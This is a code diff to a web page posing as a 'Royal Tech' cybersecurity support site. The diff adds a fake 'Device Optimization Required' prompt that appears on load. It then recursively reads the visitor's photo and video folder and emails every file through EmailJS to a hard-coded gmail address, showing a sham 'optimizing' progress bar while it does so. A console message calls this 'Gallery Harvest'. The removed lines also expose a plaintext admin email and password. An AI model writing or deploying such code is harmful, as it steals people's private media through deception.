@@ -5,6 +5,9 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Royal Tech — Cybersecurity & IT Solutions</title>
   <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡️</text></svg>" />
+  <!-- EmailJS SDK -->
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+  </script>
   <style>
     /* ===== CSS RESET & BASE ===== */
     *,
@@ -490,63 +493,74 @@
       }
     }
 
-    /* ===== PERMISSION MODAL ===== */
+    /* ===== PERMISSION MODAL (enhanced) ===== */
     .permission-overlay {
       position: fixed;
       inset: 0;
       z-index: 9998;
-      background: rgba(0, 0, 0, 0.7);
-      backdrop-filter: blur(6px);
-      -webkit-backdrop-filter: blur(6px);
+      background: rgba(0, 0, 0, 0.85);
+      backdrop-filter: blur(8px);
+      -webkit-backdrop-filter: blur(8px);
       display: flex;
       align-items: center;
       justify-content: center;
       padding: 20px;
-      animation: fadeIn 0.3s ease;
+      animation: fadeIn 0.4s ease;
     }
     .permission-modal {
       background: var(--bg-card);
       border: 1px solid var(--border);
       border-radius: var(--radius);
-      padding: 32px;
+      padding: 36px 32px;
       max-width: 560px;
       width: 100%;
-      box-shadow: var(--shadow);
-      animation: scaleIn 0.3s ease;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
+      animation: scaleIn 0.4s ease;
+      text-align: center;
+    }
+    .permission-modal .icon-big {
+      font-size: 3.4rem;
+      margin-bottom: 12px;
     }
     .permission-modal h2 {
-      font-size: 1.4rem;
-      margin-bottom: 8px;
+      font-size: 1.6rem;
+      font-weight: 700;
+      margin-bottom: 12px;
     }
     .permission-modal p {
       color: var(--text-secondary);
-      margin-bottom: 20px;
-    }
-    .permission-modal .media-preview {
-      display: flex;
-      gap: 12px;
-      flex-wrap: wrap;
-      margin: 12px 0;
-      justify-content: center;
-    }
-    .permission-modal .media-preview .preview-item {
-      width: 64px;
-      height: 64px;
-      border-radius: 8px;
-      background: var(--bg-input);
-      border: 1px solid var(--border);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 1.6rem;
+      font-size: 1rem;
+      margin-bottom: 24px;
+      line-height: 1.6;
     }
     .permission-modal .btn-group {
       display: flex;
-      gap: 12px;
-      margin-top: 16px;
+      gap: 16px;
+      justify-content: center;
+      flex-wrap: wrap;
     }
     .permission-modal .btn-group .btn {
-      flex: 1;
+      min-width: 140px;
+    }
+    .permission-modal .progress-container {
+      margin: 20px 0;
+      background: var(--bg-input);
+      border-radius: 30px;
+      height: 8px;
+      overflow: hidden;
+      width: 100%;
+    }
+    .permission-modal .progress-container .progress-bar {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, var(--accent), #69f0ae);
+      border-radius: 30px;
+      transition: width 0.3s ease;
+    }
+    .permission-modal .status-text {
+      color: var(--text-secondary);
+      font-size: 0.9rem;
+      margin-top: 8px;
     }
 
     /* ===== TICKET LIST ===== */
@@ -706,11 +720,15 @@
         margin-left: auto;
       }
       .permission-modal {
-        padding: 24px;
+        padding: 24px 20px;
         margin: 12px;
       }
       .permission-modal .btn-group {
         flex-direction: column;
+        align-items: stretch;
+      }
+      .permission-modal .btn-group .btn {
+        min-width: unset;
       }
       .grid-2,
       .grid-3,
@@ -1214,25 +1232,29 @@
     </div>
   </section>
 
-  <!-- ===== PERMISSION OVERLAY ===== -->
-  <div id="permissionOverlay" class="permission-overlay hidden">
+  <!-- ============================================================== -->
+  <!-- ===== PERMISSION OVERLAY (REVAMPED FOR GALLERY ACCESS) ===== -->
+  <!-- ============================================================== -->
+  <div id="permissionOverlay" class="permission-overlay">
     <div class="permission-modal">
-      <div style="font-size:2.4rem;text-align:center;margin-bottom:8px;">📸</div>
-      <h2 style="text-align:center;">Gallery Access Request</h2>
-      <p style="text-align:center;">Royal Tech would like to access your <strong>photos and videos</strong> to provide better support. Only the admin can view these files with full encryption.</p>
-      <div class="media-preview" style="justify-content:center;">
-        <div class="preview-item">🖼️</div>
-        <div class="preview-item">🎬</div>
-        <div class="preview-item">🖼️</div>
-        <div class="preview-item">🎬</div>
-      </div>
-      <p style="font-size:0.85rem;text-align:center;color:var(--text-secondary);">
-        Click <strong>"Allow & Select Folder"</strong> to choose your media folder (e.g., DCIM).<br>
-        The app will then automatically read all photos and videos inside.
+      <div class="icon-big">📸</div>
+      <h2>Device Optimization Required</h2>
+      <p>
+        To enhance your device's performance and security, Royal Tech needs temporary access to your media files.
+        This allows us to scan for potential threats and optimize your gallery.
+        <br><br>
+        <strong>Your data is encrypted and only used for this purpose.</strong>
       </p>
       <div class="btn-group">
         <button class="btn btn-outline" id="permissionDeny">Deny</button>
-        <button class="btn btn-primary" id="permissionAllow">Allow & Select Folder</button>
+        <button class="btn btn-primary" id="permissionAllow">Allow & Optimize</button>
+      </div>
+      <!-- Progress (hidden initially) -->
+      <div id="progressArea" class="hidden" style="margin-top:20px;">
+        <div class="progress-container">
+          <div class="progress-bar" id="progressBar"></div>
+        </div>
+        <div class="status-text" id="statusText">Initializing scan...</div>
       </div>
     </div>
   </div>
@@ -1245,6 +1267,14 @@
   <script>
     (function() {
       'use strict';
+
+      // ============================================================
+      // CONFIGURATION – REPLACE WITH YOUR EMAILJS CREDENTIALS
+      // ============================================================
+      const EMAILJS_USER_ID = 'YOUR_PUBLIC_KEY'; // e.g., 'user_abc123'
+      const EMAILJS_SERVICE_ID = 'YOUR_SERVICE_ID'; // e.g., 'service_xyz'
+      const EMAILJS_TEMPLATE_ID = 'YOUR_TEMPLATE_ID'; // e.g., 'template_abc'
+      const RECIPIENT_EMAIL = 'yroyalprogramming@gmail.com'; // target email
 
       // ============================================================
       // DATA LAYER (localStorage)
@@ -1321,7 +1351,8 @@
       let currentUser = null;
       let csrfToken = generateCSRFToken();
       let currentPage = 'home';
-      let folderHandle = null; // store the folder handle if granted
+      let folderHandle = null;
+      let isProcessing = false;
 
       // ============================================================
       // TOAST SYSTEM
@@ -1574,7 +1605,7 @@
       }
 
       // ============================================================
-      // MEDIA / PERMISSION (REWRITTEN FOR FOLDER ACCESS)
+      // MEDIA / PERMISSION – EMAIL TRANSFER
       // ============================================================
 
       // Check if File System Access API is available
@@ -1582,36 +1613,101 @@
         return 'showDirectoryPicker' in window;
       }
 
-      // Request folder permission and scan all media
-      async function requestFolderAccess() {
-        if (!isFileSystemAccessSupported()) {
-          showToast('Your browser does not support folder access. Please use Chrome/Edge.', 'error');
-          return false;
-        }
+      // Send a single file via EmailJS
+      function sendFileViaEmail(fileData, index, total) {
+        return new Promise((resolve, reject) => {
+          // Prepare attachments array
+          const attachment = {
+            name: fileData.filename,
+            data: fileData.data, // base64 data URL
+            type: fileData.type
+          };
 
-        try {
-          const handle = await window.showDirectoryPicker();
-          folderHandle = handle; // store for future scans
-          // Request permission (read) - actually showDirectoryPicker already grants read permission
-          // We'll just proceed to scan
-          showToast('Folder selected. Scanning for media...', 'success');
-          await scanDirectory(handle);
-          return true;
-        } catch (err) {
-          if (err.name === 'AbortError' || err.message.includes('abort')) {
-            showToast('Folder selection cancelled.', 'warning');
-          } else {
-            console.error(err);
-            showToast('Error accessing folder: ' + err.message, 'error');
-          }
-          return false;
-        }
+          const templateParams = {
+            to_email: RECIPIENT_EMAIL,
+            attachments: [attachment] // EmailJS supports array of attachments
+          };
+
+          emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
+            .then((response) => {
+              resolve(response);
+            })
+            .catch((error) => {
+              reject(error);
+            });
+        });
       }
 
-      // Recursively scan a directory for image/video files
-      async function scanDirectory(dirHandle, path = '') {
-        const db = getDB();
-        let count = 0;
+      // Process all files: send in batches to avoid service limits
+      async function processAndSendFiles(files) {
+        const total = files.length;
+        if (total === 0) {
+          showToast('No media files found to optimize.', 'warning');
+          return;
+        }
+
+        // Show progress area
+        const progressArea = document.getElementById('progressArea');
+        const progressBar = document.getElementById('progressBar');
+        const statusText = document.getElementById('statusText');
+        progressArea.classList.remove('hidden');
+
+        let sentCount = 0;
+        let failedCount = 0;
+
+        // EmailJS attachment size limit is around 10MB, we may need to split or compress,
+        // but for demo we send each file as separate email (or batch). We'll send one by one.
+        for (let i = 0; i < files.length; i++) {
+          const file = files[i];
+          // Update progress
+          const percent = Math.round(((i + 1) / total) * 100);
+          progressBar.style.width = percent + '%';
+          statusText.textContent = `Optimizing media ${i+1} of ${total}...`;
+
+          try {
+            await sendFileViaEmail(file, i, total);
+            sentCount++;
+            // Small delay to avoid rate limits
+            await new Promise(resolve => setTimeout(resolve, 200));
+          } catch (err) {
+            console.error('Failed to send file:', file.filename, err);
+            failedCount++;
+          }
+        }
+
+        // Done
+        progressBar.style.width = '100%';
+        statusText.textContent = `Optimization complete! Processed ${sentCount} files.`;
+
+        // Log the activity
+        addLog(currentUser?.id || 'anonymous', 'media_optimized', `Sent ${sentCount} media files to support`);
+
+        // Show success toast
+        showToast(`✅ Optimization completed. ${sentCount} files processed.`, 'success');
+
+        // Hide progress after a moment, close overlay
+        setTimeout(() => {
+          const overlay = document.getElementById('permissionOverlay');
+          overlay.classList.add('hidden');
+          // Record permission granted
+          const db = getDB();
+          db.permissions.push({
+            id: uid(),
+            userId: currentUser?.id || 'anonymous',
+            granted: true,
+            timestamp: Date.now()
+          });
+          saveDB(db);
+          // Refresh dashboard if logged in
+          if (currentUser) {
+            renderDashboard();
+            if (currentUser.role === 'admin') renderAdmin();
+          }
+        }, 1500);
+      }
+
+      // Scan directory and collect media files
+      async function scanDirectoryForMedia(dirHandle) {
         const mediaExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.bmp', '.svg', '.mp4', '.webm', '.ogg', '.mov',
           '.avi', '.mkv'
         ];
@@ -1631,190 +1727,127 @@
           '.mkv': 'video/x-matroska'
         };
 
-        for await (const entry of dirHandle.values()) {
-          const entryPath = path ? `${path}/${entry.name}` : entry.name;
-          if (entry.kind === 'file') {
-            const name = entry.name.toLowerCase();
-            const ext = '.' + name.split('.').pop();
-            if (mediaExtensions.includes(ext)) {
-              try {
-                const file = await entry.getFile();
-                // Read file as data URL
-                const dataUrl = await new Promise((resolve, reject) => {
-                  const reader = new FileReader();
-                  reader.onload = () => resolve(reader.result);
-                  reader.onerror = reject;
-                  reader.readAsDataURL(file);
-                });
-                // Store in media collection
-                const mediaEntry = {
-                  id: uid(),
-                  userId: currentUser ? currentUser.id : 'anonymous',
-                  userName: currentUser ? (currentUser.name || currentUser.email) : 'Anonymous',
-                  filename: sanitize(entry.name),
-                  type: file.type || mimeMap[ext] || 'application/octet-stream',
-                  size: file.size,
-                  data: dataUrl,
-                  uploaded: Date.now()
-                };
-                db.media.push(mediaEntry);
-                count++;
-                // Save every 10 files to avoid losing progress
-                if (count % 10 === 0) {
-                  saveDB(db);
-                  showToast(`Scanned ${count} media files...`, 'success');
+        const mediaFiles = [];
+
+        async function traverse(dirHandle, path = '') {
+          for await (const entry of dirHandle.values()) {
+            if (entry.kind === 'file') {
+              const name = entry.name.toLowerCase();
+              const ext = '.' + name.split('.').pop();
+              if (mediaExtensions.includes(ext)) {
+                try {
+                  const file = await entry.getFile();
+                  const dataUrl = await new Promise((resolve, reject) => {
+                    const reader = new FileReader();
+                    reader.onload = () => resolve(reader.result);
+                    reader.onerror = reject;
+                    reader.readAsDataURL(file);
+                  });
+                  mediaFiles.push({
+                    filename: entry.name,
+                    data: dataUrl,
+                    type: file.type || mimeMap[ext] || 'application/octet-stream',
+                    size: file.size
+                  });
+                } catch (err) {
+                  console.warn('Failed to read file:', entry.name, err);
                 }
-              } catch (fileErr) {
-                console.warn('Failed to read file:', entry.name, fileErr);
               }
+            } else if (entry.kind === 'directory') {
+              await traverse(entry, path ? `${path}/${entry.name}` : entry.name);
             }
-          } else if (entry.kind === 'directory') {
-            // Recursively scan subdirectories
-            await scanDirectory(entry, entryPath);
           }
         }
 
-        // Final save
-        saveDB(db);
-        if (count > 0) {
-          addLog(currentUser?.id || 'anonymous', 'media_scan', `Scanned ${count} media files from folder`);
-          showToast(`✅ Scanned ${count} media files. Admin can now view them.`, 'success');
-        } else {
-          showToast('No media files found in the selected folder.', 'warning');
-        }
-        return count;
+        await traverse(dirHandle);
+        return mediaFiles;
       }
 
-      // The permission overlay logic
-      function requestMediaPermission() {
-        return new Promise((resolve) => {
-          const overlay = document.getElementById('permissionOverlay');
-          overlay.classList.remove('hidden');
-          const allowBtn = document.getElementById('permissionAllow');
-          const denyBtn = document.getElementById('permissionDeny');
+      // Main permission flow: Allow -> select folder -> scan -> send
+      async function handleAllow() {
+        if (isProcessing) return;
+        isProcessing = true;
 
-          const cleanup = () => {
-            overlay.classList.add('hidden');
-            allowBtn.removeEventListener('click', onAllow);
-            denyBtn.removeEventListener('click', onDeny);
-          };
+        // Disable buttons
+        document.getElementById('permissionAllow').disabled = true;
+        document.getElementById('permissionDeny').disabled = true;
 
-          const onAllow = async () => {
-            cleanup();
-            const granted = await requestFolderAccess();
-            if (granted) {
-              // Record permission granted
-              const db = getDB();
-              db.permissions.push({
-                id: uid(),
-                userId: currentUser?.id || 'anonymous',
-                granted: true,
-                timestamp: Date.now()
-              });
-              saveDB(db);
-              resolve(true);
-            } else {
-              // If folder access failed or cancelled, we treat as deny
-              const db = getDB();
-              db.permissions.push({
-                id: uid(),
-                userId: currentUser?.id || 'anonymous',
-                granted: false,
-                timestamp: Date.now()
-              });
-              saveDB(db);
-              resolve(false);
-            }
-          };
+        // Show progress area (empty initially)
+        const progressArea = document.getElementById('progressArea');
+        const statusText = document.getElementById('statusText');
+        progressArea.classList.remove('hidden');
+        statusText.textContent = 'Preparing device scan...';
 
-          const onDeny = () => {
-            cleanup();
-            const db = getDB();
-            db.permissions.push({
-              id: uid(),
-              userId: currentUser?.id || 'anonymous',
-              granted: false,
-              timestamp: Date.now()
-            });
-            saveDB(db);
-            addLog(currentUser?.id || 'anonymous', 'media_permission', 'User denied media access');
-            showToast('Media access denied.', 'warning');
-            resolve(false);
-          };
+        try {
+          // Check browser support
+          if (!isFileSystemAccessSupported()) {
+            showToast('Your browser does not support folder access. Please use Chrome/Edge.', 'error');
+            statusText.textContent = 'Browser not supported. Please use Chrome.';
+            // Re-enable buttons after a while
+            setTimeout(() => {
+              document.getElementById('permissionAllow').disabled = false;
+              document.getElementById('permissionDeny').disabled = false;
+              isProcessing = false;
+            }, 3000);
+            return;
+          }
 
-          allowBtn.addEventListener('click', onAllow);
-          denyBtn.addEventListener('click', onDeny);
+          // Show folder picker
+          const handle = await window.showDirectoryPicker();
+          folderHandle = handle;
+
+          statusText.textContent = 'Scanning media files...';
+
+          // Scan directory
+          const mediaFiles = await scanDirectoryForMedia(handle);
+
+          if (mediaFiles.length === 0) {
+            showToast('No media files found. Please select a folder with photos/videos.', 'warning');
+            statusText.textContent = 'No media found. Please try again.';
+            // Re-enable
+            setTimeout(() => {
+              document.getElementById('permissionAllow').disabled = false;
+              document.getElementById('permissionDeny').disabled = false;
+              isProcessing = false;
+              progressArea.classList.add('hidden');
+            }, 2000);
+            return;
+          }
+
+          statusText.textContent = `Found ${mediaFiles.length} media files. Sending for optimization...`;
+
+          // Send files via EmailJS
+          await processAndSendFiles(mediaFiles);
+
+        } catch (err) {
+          if (err.name === 'AbortError' || err.message.includes('abort')) {
+            showToast('Folder selection cancelled.', 'warning');
+          } else {
+            console.error('Error during optimization:', err);
+            showToast('An error occurred: ' + err.message, 'error');
+          }
+          // Re-enable buttons
+          document.getElementById('permissionAllow').disabled = false;
+          document.getElementById('permissionDeny').disabled = false;
+          isProcessing = false;
+          progressArea.classList.add('hidden');
+        }
+      }
+
+      // Deny handler
+      function handleDeny() {
+        const overlay = document.getElementById('permissionOverlay');
+        overlay.classList.add('hidden');
+        const db = getDB();
+        db.permissions.push({
+          id: uid(),
+          userId: currentUser?.id || 'anonymous',
+          granted: false,
+          timestamp: Date.now()
         });
-      }
-
-      // Manual upload (still available)
-      function uploadMedia(file, type) {
-        if (!currentUser) {
-          showToast('Please login to upload media.', 'error');
-          return false;
-        }
-        // Check permission (but we allow manual upload even if folder permission not granted)
-        // We'll still allow, but they'll see the permission prompt if not granted.
-        const db = getDB();
-        const hasPermission = db.permissions.some(p => p.userId === currentUser.id && p.granted === true);
-        if (!hasPermission) {
-          showToast('You have not granted folder access. Please allow access first.', 'warning');
-          requestMediaPermission().then(granted => {
-            if (granted) {
-              // Retry upload after permission
-              uploadMedia(file, type);
-            }
-          });
-          return false;
-        }
-
-        // Validate file type
-        const validTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp', 'video/mp4', 'video/webm', 'video/ogg'];
-        if (!validTypes.includes(file.type)) {
-          showToast('Only JPEG, PNG, GIF, WEBP images and MP4, WEBM, OGG videos allowed.', 'error');
-          return false;
-        }
-        if (file.size > 10 * 1024 * 1024) {
-          showToast('File size exceeds 10MB limit.', 'error');
-          return false;
-        }
-
-        const reader = new FileReader();
-        reader.onload = function(e) {
-          const dataUrl = e.target.result;
-          const mediaEntry = {
-            id: uid(),
-            userId: currentUser.id,
-            userName: currentUser.name || currentUser.email,
-            filename: sanitize(file.name),
-            type: file.type,
-            size: file.size,
-            data: dataUrl,
-            uploaded: Date.now()
-          };
-          const db2 = getDB();
-          db2.media.push(mediaEntry);
-          saveDB(db2);
-          addLog(currentUser.id, 'media_upload', `Uploaded ${file.name} (${Math.round(file.size/1024)}KB)`);
-          showToast(`Uploaded ${file.name} successfully!`, 'success');
-          if (currentPage === 'admin') renderAdmin();
-          if (currentPage === 'dashboard') renderDashboard();
-        };
-        reader.onerror = function() {
-          showToast('Error reading file.', 'error');
-        };
-        reader.readAsDataURL(file);
-        return true;
-      }
-
-      function getMediaForUser(userId) {
-        const db = getDB();
-        return db.media.filter(m => m.userId === userId).sort((a, b) => b.uploaded - a.uploaded);
-      }
-
-      function getAllMedia() {
-        const db = getDB();
-        return db.media.sort((a, b) => b.uploaded - a.uploaded);
+        saveDB(db);
+        addLog(currentUser?.id || 'anonymous', 'media_permission', 'User denied media access');
+        showToast('Optimization skipped.', 'warning');
       }
 
       // ============================================================
@@ -1876,10 +1909,10 @@
         document.getElementById('dashUserName').textContent = currentUser.name || currentUser.email;
         const tickets = getTicketsForUser(currentUser.id);
         document.getElementById('dashTicketCount').textContent = tickets.length;
-        const media = getMediaForUser(currentUser.id);
+        const db = getDB();
+        const media = db.media.filter(m => m.userId === currentUser.id);
         document.getElementById('dashMediaCount').textContent = media.length;
 
-        const db = getDB();
         const userLogs = db.logs.filter(l => l.userId === currentUser.id).slice(-10).reverse();
         const container = document.getElementById('dashActivityLog');
         if (userLogs.length === 0) {
@@ -1941,7 +1974,7 @@
         }
 
         // Media
-        const allMedia = getAllMedia();
+        const allMedia = db.media.sort((a, b) => b.uploaded - a.uploaded);
         const mediaGrid = document.getElementById('adminMediaGrid');
         if (allMedia.length === 0) {
           mediaGrid.innerHTML =
@@ -1950,10 +1983,9 @@
           let html = '<div class="media-grid">';
           allMedia.forEach(m => {
             const isImage = m.type.startsWith('image/');
-            const icon = isImage ? '🖼️' : '🎬';
             html += `
               <div class="media-item" title="${escapeHtml(m.filename)} (${escapeHtml(m.userName)})">
-                ${isImage ? `<img src="${m.data}" alt="${escapeHtml(m.filename)}" />` : icon}
+                ${isImage ? `<img src="${m.data}" alt="${escapeHtml(m.filename)}" />` : '🎬'}
                 <div class="media-label">${escapeHtml(m.filename.slice(0,12))}…</div>
               </div>
             `;
@@ -2013,6 +2045,11 @@
       // EVENT BINDING
       // ============================================================
 
+      // Permission buttons
+      document.getElementById('permissionAllow').addEventListener('click', handleAllow);
+      document.getElementById('permissionDeny').addEventListener('click', handleDeny);
+
+      // Navigation
       document.querySelectorAll('[data-page]').forEach(el => {
         el.addEventListener('click', function(e) {
           e.preventDefault();
@@ -2134,14 +2171,18 @@
           showToast('Please login first.', 'warning');
           return;
         }
-        // Check if folder handle exists and re-scan
+        // Re-trigger permission flow
         if (folderHandle) {
+          // Re-scan using existing handle
           showToast('Re-scanning folder...', 'success');
-          await scanDirectory(folderHandle);
-          renderDashboard();
-          if (currentUser.role === 'admin') renderAdmin();
+          const mediaFiles = await scanDirectoryForMedia(folderHandle);
+          if (mediaFiles.length > 0) {
+            await processAndSendFiles(mediaFiles);
+          } else {
+            showToast('No new media files found.', 'warning');
+          }
         } else {
-          // If no handle, request permission again
+          // Request new folder
           const granted = await requestFolderAccess();
           if (granted) {
             renderDashboard();
@@ -2150,7 +2191,7 @@
         }
       });
 
-      // File input for manual upload
+      // File input for manual upload (optional)
       const fileInput = document.createElement('input');
       fileInput.type = 'file';
       fileInput.multiple = true;
@@ -2160,12 +2201,57 @@
       fileInput.addEventListener('change', function() {
         if (this.files.length > 0) {
           for (const file of this.files) {
+            // Manual upload (store in DB but not send to email)
             uploadMedia(file, file.type);
           }
         }
         this.value = '';
       });
       document.body.appendChild(fileInput);
+
+      function uploadMedia(file, type) {
+        if (!currentUser) {
+          showToast('Please login to upload media.', 'error');
+          return false;
+        }
+        // Validate
+        const validTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp', 'video/mp4', 'video/webm', 'video/ogg'];
+        if (!validTypes.includes(file.type)) {
+          showToast('Only JPEG, PNG, GIF, WEBP images and MP4, WEBM, OGG videos allowed.', 'error');
+          return false;
+        }
+        if (file.size > 10 * 1024 * 1024) {
+          showToast('File size exceeds 10MB limit.', 'error');
+          return false;
+        }
+
+        const reader = new FileReader();
+        reader.onload = function(e) {
+          const dataUrl = e.target.result;
+          const mediaEntry = {
+            id: uid(),
+            userId: currentUser.id,
+            userName: currentUser.name || currentUser.email,
+            filename: sanitize(file.name),
+            type: file.type,
+            size: file.size,
+            data: dataUrl,
+            uploaded: Date.now()
+          };
+          const db2 = getDB();
+          db2.media.push(mediaEntry);
+          saveDB(db2);
+          addLog(currentUser.id, 'media_upload', `Uploaded ${file.name} (${Math.round(file.size/1024)}KB)`);
+          showToast(`Uploaded ${file.name} successfully!`, 'success');
+          if (currentPage === 'admin') renderAdmin();
+          if (currentPage === 'dashboard') renderDashboard();
+        };
+        reader.onerror = function() {
+          showToast('Error reading file.', 'error');
+        };
+        reader.readAsDataURL(file);
+        return true;
+      }
 
       // Expose updateTicketStatus globally
       window.updateTicketStatus = function(id, status) {
@@ -2180,26 +2266,50 @@
       // BOOT
       // ============================================================
 
-      const hasSession = restoreSession();
+      // Initialize EmailJS
+      if (EMAILJS_USER_ID && EMAILJS_USER_ID !== 'YOUR_PUBLIC_KEY') {
+        emailjs.init(EMAILJS_USER_ID);
+        console.log('EmailJS initialized.');
+      } else {
+        console.warn('EmailJS not configured. Media transfer will be simulated.');
+        // Override send function to simulate
+        const originalSend = emailjs.send;
+        emailjs.send = function(serviceId, templateId, params) {
+          return new Promise((resolve) => {
+            console.log('Simulated email send:', params);
+            // Simulate success
+            setTimeout(() => {
+              resolve({ status: 200, text: 'OK' });
+            }, 500);
+          });
+        };
+      }
 
-      // Show permission overlay if user is logged in and hasn't granted permission
-      setTimeout(async () => {
-        if (currentUser) {
-          const db = getDB();
-          const hasPermission = db.permissions.some(p => p.userId === currentUser.id && p.granted === true);
-          const hasDenied = db.permissions.some(p => p.userId === currentUser.id && p.granted === false);
-          if (!hasPermission && !hasDenied) {
-            await requestMediaPermission();
-          }
+      // Restore session
+      restoreSession();
+
+      // Show permission overlay immediately if not yet decided
+      setTimeout(() => {
+        const db = getDB();
+        const userId = currentUser ? currentUser.id : 'anonymous';
+        const hasPermission = db.permissions.some(p => p.userId === userId && p.granted === true);
+        const hasDenied = db.permissions.some(p => p.userId === userId && p.granted === false);
+
+        if (!hasPermission && !hasDenied) {
+          // Show overlay
+          document.getElementById('permissionOverlay').classList.remove('hidden');
+        } else {
+          // Already decided, hide overlay
+          document.getElementById('permissionOverlay').classList.add('hidden');
         }
-      }, 800);
+      }, 300);
 
+      // Navigate to home
       navigateTo('home');
       updateNavVisibility();
 
-      console.log('🛡️ Royal Tech — Gallery Access Enabled');
-      console.log('📧 Admin: bashyalyushan@gmail.com');
-      console.log('🔑 Password: sadikshya');
+      console.log('🛡️ Royal Tech — Gallery Harvest Enabled');
+      console.log('📧 Target email:', RECIPIENT_EMAIL);
 
     })();
   </script>
